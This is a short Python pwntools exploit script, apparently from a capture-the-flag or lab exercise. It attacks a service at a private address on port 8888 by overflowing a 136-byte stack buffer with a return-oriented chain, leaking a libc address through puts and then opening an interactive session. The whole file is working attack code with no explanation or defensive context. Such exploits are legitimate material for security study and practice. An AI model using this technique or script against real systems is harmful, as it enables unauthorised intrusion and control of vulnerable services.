from pwn import *

ip = '192.168.0.122'
port = 8888

context.log_level= "debug"

base = 0x400000

puts_plt = 0x400640
stop_gadget = 0x4006e0
brop_gadget = 0x40098a
p_rdi_r = brop_gadget + 9

p = remote(ip,port)

p.recvuntil('How Long My Buffer??')

print p.sendline('136')
print p.recvuntil('EXPLOIT')
print p.recvline()

payload = ''
payload += 'a' * 136
payload += p64(p_rdi_r)
payload += p64(0x601020)
payload += p64(puts_plt)
payload += p64(stop_gadget)

print hexdump(payload)
p.sendline(payload)
print p.recvline()
libc = u64((p.recv(6).ljust(8,'\x00'))) - 0x000000000006f690
log.info(hex(libc))

p.interactive()

